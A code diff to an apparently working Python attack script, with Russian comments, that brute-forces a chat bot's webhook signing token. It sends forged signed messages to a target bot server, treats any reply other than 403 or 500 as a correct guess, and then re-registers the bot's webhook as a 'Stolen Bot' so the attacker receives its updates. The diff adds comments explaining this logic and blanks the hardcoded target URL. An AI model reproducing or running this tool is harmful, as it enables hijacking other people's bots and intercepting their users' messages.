@@ -8,9 +8,9 @@ from optparse import OptionParser
 
 import requests
 
-LIMIT = 1000
-URL = 'https://intense-reaches-70533.herokuapp.com/'
-TOKEN = '4453b6ac12345678-e02c5f12174805f9-daec9cbb5448c51f'
+LIMIT = 1000  # количество итераций
+URL = None  # атакуемы ресурс
+TOKEN = '4453b6ac12345678-e02c5f12174805f9-daec9cbb5448c51f'  # токен инициализации
 
 
 def read(filename):
@@ -64,6 +64,9 @@ def send_message(url, message, signature):
 
 
 def steal_token(token):
+    """
+    Если удалось перебрать токен бота, то заменяем webhook бота на свой webhook и получаем обновления на своем боте.
+    """
     body = {
         "name": "Stolen Bot",
         "avatar": "https://www.python.org/static/opengraph-icon-200x200.png",
@@ -91,25 +94,28 @@ def attack(url=URL, limit=LIMIT, token=TOKEN):
     while limit > 0:
         data = read('data.json')
         for i, message in enumerate(data):
+
             message['timestamp'] = get_message_timestamp()
             message['message_token'] = get_message_token()
 
             signature = sign_message(token, message)
-            resp = send_message(url, message, signature)
 
+            resp = send_message(url, message, signature)
             if resp is not None:
                 logging.info(
                     'Num: {0} status code: {1}, token: {2}, resp: {3}'.format(i, resp.status_code, token, resp.content))
 
-                if resp.status_code == 200:
-
+                # если запрос вернул ответ с кодом отличным от 403 и 500, то можно считать,
+                # что получилось подобрать токен атакуемого бота, так как на стороне сервера бота,
+                # бот проверяет подпись своим токеном, если наша сгенерированная подпись совпала
+                # с подписью бота, то наш токен соответствует токену бота.
+                if resp.status_code != 403 and resp.status_code != 500:
                     resp = steal_token(token)
                     if resp is not None and resp.status_code == 200:
                         logging.info("Token {} is stolen".format(token))
                         logging.info("Bot info: {}".format(resp.json()))
                         limit = 0
                         break
-
                 else:
                     token = get_token()
 
@@ -139,6 +145,6 @@ if __name__ == "__main__":
                         filemode='a',
                         level=logging.INFO)
 
-    logging.info('Start')
+    logging.info('Start attack')
     attack(URL, LIMIT, TOKEN)
-    logging.info('End')
+    logging.info('The End')
